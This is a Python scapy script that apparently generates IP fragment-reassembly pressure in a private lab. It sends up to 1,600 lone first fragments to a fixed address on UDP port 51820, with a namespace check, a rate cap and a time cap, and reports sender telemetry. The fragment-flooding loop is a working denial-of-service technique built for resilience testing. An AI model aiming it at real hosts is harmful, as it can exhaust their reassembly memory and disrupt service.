#!/usr/bin/env python3
"""Hard-limited incomplete-fragment probe for the private fj-* namespace lab only.

Never provides destination/rate/count options: target and traffic ceiling are fixed.
"""
import os
import argparse
import json
import resource
import signal
import time
from scapy.all import IP, UDP, Raw, fragment, send, conf

# Verify this executable runs only in the expected disposable client namespace.
if (os.stat('/proc/self/ns/net').st_ino !=
        os.stat('/var/run/netns/fj-client').st_ino):
    raise SystemExit('Refusing to run outside the fj-client namespace')

DESTINATION = '10.200.1.2'
SOURCE = '10.200.2.2'
TOTAL = 1600             # fixed ceiling; at least 20 seconds at 80/s
GAP = 0.0125             # at most 80 sent fragments per second
MAX_SECONDS = 40         # stop even if packet generation is unexpectedly slow
conf.verb = 0

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--report', help='write bounded sender telemetry as JSON')
args = parser.parse_args()

def stop(_signum, _frame):
    raise SystemExit('Pressure generator interrupted')

signal.signal(signal.SIGTERM, stop)
start = time.monotonic()
sent = 0
print(f'[+0.0s] Sending at most {TOTAL} incomplete datagrams at <=80 packets/s', flush=True)
try:
    for i in range(TOTAL):
        if time.monotonic() - start >= MAX_SECONDS:
            break
        datagram = (IP(src=SOURCE, dst=DESTINATION, id=20000 + i) /
                    UDP(sport=42000, dport=51820) /
                    Raw(b'P' * 1300))
        fragments = fragment(datagram, fragsize=560)
        assert len(fragments) >= 2
        send(fragments[0], verbose=0)
        sent += 1
        if sent % 80 == 0:
            print(f'[+{time.monotonic() - start:.1f}s] Sent {sent}/{TOTAL}', flush=True)
        time.sleep(GAP)
finally:
    elapsed = time.monotonic() - start
    report = {'event': 'attacker_sender', 'sent_first_fragments': sent,
              'limit': TOTAL, 'elapsed_seconds': round(elapsed, 3),
              'max_rss_kib': resource.getrusage(resource.RUSAGE_SELF).ru_maxrss}
    print(f'[+{elapsed:.1f}s] Finished after {sent}/{TOTAL}; '
          f'peak sender RSS={report["max_rss_kib"]} KiB', flush=True)
    if args.report:
        with open(args.report, 'w', encoding='utf-8') as stream:
            json.dump(report, stream)
            stream.write('\n')
